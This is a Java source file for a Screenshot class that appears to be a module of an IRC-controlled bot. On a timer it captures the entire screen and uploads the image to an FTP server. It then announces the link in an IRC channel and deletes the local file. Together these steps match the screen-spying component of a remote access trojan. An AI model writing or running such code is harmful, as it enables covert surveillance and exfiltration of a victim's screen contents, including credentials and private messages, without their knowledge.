import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import javax.imageio.ImageIO;
/**
 * Screenshot class
 * @author Nathan
 *
 */
public class Screenshot extends Thread
{
	/**
	 * Sets the number of seconds after to take the screenshot, and where to save it as
	 * @param seconds
	 * @param outfileName
	 */
    public Screenshot(int seconds, String outfileName)
    {
        outFileName = outfileName;
        this.seconds = seconds;
    }
    /**
     * Takes a new screenshot and saves it in the specified location after the specified time.
     */
    public void run()
    {
        String outFileName = this.outFileName;
        if(outFileName == null)
            IRC.sendMessage(Config.getChannel(), "You must set a output file name!");
        try
        {
            long time = (long)seconds * 1000L;
            System.out.println((new StringBuilder("Waiting ")).append(time / 1000L).append(" second(s)...").toString());
            try
            {
                Thread.sleep(time);
            }
            catch(InterruptedException e)
            {
                e.printStackTrace();
            }
        }
        catch(NumberFormatException nfe)
        {
            IRC.sendMessage(Config.getChannel(), "Wait time is not a number!");
        }
        Toolkit toolkit = Toolkit.getDefaultToolkit();
        Dimension screenSize = toolkit.getScreenSize();
        Rectangle screenRect = new Rectangle(screenSize);
        Robot robot = null;
        try
        {
            robot = new Robot();
        }
        catch(AWTException e1)
        {
            e1.printStackTrace();
        }
        BufferedImage image = robot.createScreenCapture(screenRect);
        try
        {
            ImageIO.write(image, "png", new File(outFileName));
        }
        catch(IOException e)
        {
            e.printStackTrace();
        }
        IRC.sendMessage(Config.getChannel(), (new StringBuilder("Saved screen shot (")).append(image.getWidth()).append(" x ").append(image.getHeight()).append(" pixels) to file \"").append(outFileName).append("\".").toString());
        IRC.sendMessage(Config.getChannel(), "Uploading image to FTP server!");
        FTPConnection ftp = new FTPConnection();
        try {
        ftp.connect(Config.getFtpHost());
        ftp.login(Config.getFtpUser(), Config.getFtpPassword());
        String serverFile = Config.getNick()+""+Misc.randomNumber(99999);
        ftp.uploadFile(Config.getDirLoc()+"Screens/"+serverFile+".png", outFileName);
        ftp.disconnect();
        IRC.sendMessage(Config.getChannel(), "File uploaded, can be acsessed at "+Config.getSite()+"/Screens/"+serverFile+".png");
        } catch (Exception e) {
        	IRC.sendMessage(Config.getChannel(), "Error while uploading file to FTP, check settings");
        }
        try {
        	File file = new File(outFileName);
        	file.delete();
        } catch (Exception e) {
        	IRC.sendMessage(Config.getChannel(), "Error while deleting local copy of file!");
        }
        IRC.sendMessage(Config.getChannel(), "Local copy deleted!");
    }

    private int seconds;
    private String outFileName;
}